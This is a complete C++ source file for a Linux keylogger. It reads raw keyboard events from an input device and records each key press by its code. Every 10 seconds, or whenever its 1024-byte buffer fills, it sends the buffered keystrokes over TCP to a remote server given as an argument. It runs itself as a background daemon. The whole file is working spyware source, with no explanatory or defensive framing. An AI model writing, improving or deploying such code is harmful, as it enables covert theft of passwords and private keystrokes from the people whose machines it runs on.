#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <linux/input.h>

#define BUFFER_SIZE 1024
#define SEND_INTERVAL 10

void send_to_server(const std::string& server_ip, int server_port, const std::string& data) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        std::cerr << "Error creating socket\n";
        return;
    }

    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    inet_pton(AF_INET, server_ip.c_str(), &server_addr.sin_addr);

    if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        std::cerr << "Error connecting to server\n";
        close(sock);
        return;
    }

    send(sock, data.c_str(), data.size(), 0);
    close(sock);
}

void keylogger(const std::string& server_ip, int server_port, const std::string& device_path) {
    std::ifstream input(device_path, std::ios::binary);
    if (!input.is_open()) {
        std::cerr << "Error: Cannot open input device\n";
        return;
    }

    struct input_event ev;
    std::string buffer;

    while (true) {
        input.read(reinterpret_cast<char*>(&ev), sizeof(ev));
        if (input.eof()) break;

        if (ev.type == EV_KEY && ev.value == 1) {
            buffer += "Key " + std::to_string(ev.code) + " pressed\n";

            if (buffer.size() >= BUFFER_SIZE) {
                send_to_server(server_ip, server_port, buffer);
                buffer.clear();
            }
        }

        static auto last_sent = std::chrono::steady_clock::now();
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - last_sent).count() >= SEND_INTERVAL) {
            if (!buffer.empty()) {
                send_to_server(server_ip, server_port, buffer);
                buffer.clear();
            }
            last_sent = now;
        }
    }

    if (!buffer.empty()) {
        send_to_server(server_ip, server_port, buffer);
    }
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <server_ip> <server_port> <device_path>\n";
        return 1;
    }

    std::string server_ip = argv[1];
    int server_port = std::stoi(argv[2]);
    std::string device_path = argv[3];

    if (daemon(1, 1) == -1) {
        std::cerr << "Error starting as daemon\n";
        return 1;
    }

    keylogger(server_ip, server_port, device_path);
    return 0;
}
